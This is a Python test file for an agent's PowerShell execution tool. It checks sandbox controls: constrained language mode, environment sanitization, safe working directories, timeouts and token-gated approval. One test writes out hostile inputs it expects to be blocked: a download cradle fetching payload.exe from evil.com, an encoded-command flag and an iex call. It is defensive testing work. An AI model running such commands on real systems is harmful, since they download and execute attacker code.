"""Tests for terminal.exec tool with Constrained Language Mode, AST defense, and environment sanitization."""

import os
import sys
from pathlib import Path
import pytest

from friday.security.tokens import CapabilityTokenManager
from friday.tools.policy import PolicyEngine
from friday.tools.terminal_exec import TerminalExecTool, SAFE_ENV_WHITELIST


@pytest.mark.asyncio
async def test_terminal_exec_safe_command(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])

    args = {
        "command": "Write-Output 'Execution Successful'",
        "working_dir": str(safe_root),
    }

    res = await tool.execute("call-1", args)
    assert res.success is True
    assert "Execution Successful" in res.output
    assert res.metadata["returncode"] == 0


@pytest.mark.asyncio
async def test_terminal_exec_ast_violation_blocked(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])

    # 1. Download cradle
    res_cradle = await tool.execute(
        "call-2",
        {"command": "Invoke-WebRequest -Uri 'http://evil.com' -OutFile 'payload.exe'"},
    )
    assert res_cradle.success is False
    assert "Security policy violation" in res_cradle.error

    # 2. Encoded command flag
    res_enc = await tool.execute(
        "call-3",
        {"command": "powershell.exe -EncodedCommand SQBFAFgA..."},
    )
    assert res_enc.success is False
    assert "Security policy violation" in res_enc.error

    # 3. Dynamic evaluation / IEX
    res_iex = await tool.execute(
        "call-4",
        {"command": "iex 'Get-Process'"},
    )
    assert res_iex.success is False
    assert "Security policy violation" in res_iex.error


@pytest.mark.skipif(sys.platform != "win32", reason="PowerShell Constrained Language Mode is Windows-specific")
@pytest.mark.asyncio
async def test_terminal_exec_constrained_language_blocks_reflection(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])

    # In Constrained Language Mode, calling arbitrary .NET methods is strictly forbidden
    args = {
        "command": "[System.Math]::Sqrt(16)",
        "working_dir": str(safe_root),
    }

    res = await tool.execute("call-5", args)
    assert res.success is False
    assert (
        "MethodInvocationNotSupportedInConstrainedLanguage" in (res.error or "")
        or "Cannot invoke method" in (res.error or "")
    )


@pytest.mark.asyncio
async def test_terminal_exec_sanitized_environment(tmp_path: Path, monkeypatch):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])

    # Inject secret into parent environment
    monkeypatch.setenv("FRIDAY_SECRET_KEY", "super-secret-admin-token")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "sensitive-creds")

    # Command prints environment variable
    args = {
        "command": "Write-Output \"SECRET: $env:FRIDAY_SECRET_KEY\"",
        "working_dir": str(safe_root),
    }

    res = await tool.execute("call-6", args)
    assert res.success is True
    # The variable must NOT be present in child environment
    assert "SECRET:" in res.output
    assert "super-secret-admin-token" not in res.output

    # Verify sanitized environment dictionary
    sanitized = tool.get_sanitized_env()
    assert "FRIDAY_SECRET_KEY" not in sanitized
    assert "AWS_SECRET_ACCESS_KEY" not in sanitized
    assert "PATH" in sanitized or "Path" in sanitized


@pytest.mark.asyncio
async def test_terminal_exec_working_dir_outside_root_blocked(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    outside_dir = tmp_path / "system32"
    outside_dir.mkdir()

    tool = TerminalExecTool(safe_roots=[safe_root])
    args = {
        "command": "Write-Output 'test'",
        "working_dir": str(outside_dir),
    }

    res = await tool.execute("call-7", args)
    assert res.success is False
    assert "Working directory is outside configured safe roots" in res.error


@pytest.mark.asyncio
async def test_terminal_exec_timeout(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])

    # 1 second timeout for a 5 second sleep
    args = {
        "command": "Start-Sleep -Seconds 5",
        "working_dir": str(safe_root),
        "timeout_seconds": 1,
    }

    res = await tool.execute("call-8", args)
    assert res.success is False
    assert "timed out after 1 seconds" in res.error


@pytest.mark.asyncio
async def test_terminal_exec_policy_requires_approval_and_token(tmp_path: Path):
    safe_root = tmp_path / "workspace"
    safe_root.mkdir()
    tool = TerminalExecTool(safe_roots=[safe_root])
    token_mgr = CapabilityTokenManager("policy-secret")
    policy = PolicyEngine(token_manager=token_mgr, safe_roots=[safe_root])

    args = {"command": "dir", "working_dir": str(safe_root)}

    # Risk 2 always requires approval without token
    dec1 = policy.evaluate(tool, args)
    assert dec1.allowed is False
    assert dec1.requires_approval is True

    # Providing minted capability token allows execution
    token, _ = token_mgr.mint_token(tool.name, args)
    dec2 = policy.evaluate(tool, args, capability_token=token)
    assert dec2.allowed is True
    assert dec2.requires_approval is False
